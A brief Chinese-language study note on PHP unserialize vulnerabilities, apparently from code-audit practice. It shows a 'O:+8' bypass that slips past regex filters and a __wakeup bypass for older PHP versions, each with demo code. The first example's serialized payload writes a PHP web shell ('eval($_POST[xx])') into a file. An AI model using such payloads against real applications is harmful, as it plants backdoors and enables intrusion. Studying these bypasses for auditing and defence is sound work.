## unserialize

参考文章：
- https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day11/files/README.md
- https://secure.php.net/manual/zh/function.unserialize.php
- https://www.cnblogs.com/Mrsm1th/p/6835592.html

函数结构：
```php
unserialize ( string $str ) : mixed
```

## O类绕过

可以绕过正则检测：
```
a:1:{i:0;O:+8:"Template":2:{s:9:"cacheFile";s:10:"./test.php";s:8:"template";s:25:"<?php eval($_POST[xx]);?>";}}
```
增加了一个`+`
```php
print_r(unserialize('a:1:{i:0;O:+8:"Template":2:{s:9:"cacheFile";s:10:"./test.php";s:8:"template";s:25:"<?php eval($_POST[xx]);?>";}}'));
```

## wakeup绕过
（PHP before 5.6.25 and 7.x before 7.0.10）  
表示属性的个数大于真实的个数时，wakep魔术方法不会被执行，官方demo  
demo.php
```php
<?php
class test{
	public $a;
	public $b;
	public function __construct($bb){
		$this->a='1';
		$this->b=$bb;
		echo "__construct"."\n";
	}
	public function __sleep(){
		echo "sleep"."\n";
		return array('a');
	}
	public function __wakeup(){
		echo "wakeup"."\n";
	}
	public function __destruct(){
		echo $this->a;
		echo "__destruct"."\n";
	}
}
$a=new test('b');
$ar = serialize($a);
echo $ar."\n";
echo "111111"."\n";
print_r(@unserialize('O:4:"test":2:{s:1:"a";s:1:"1";}'));
?>
```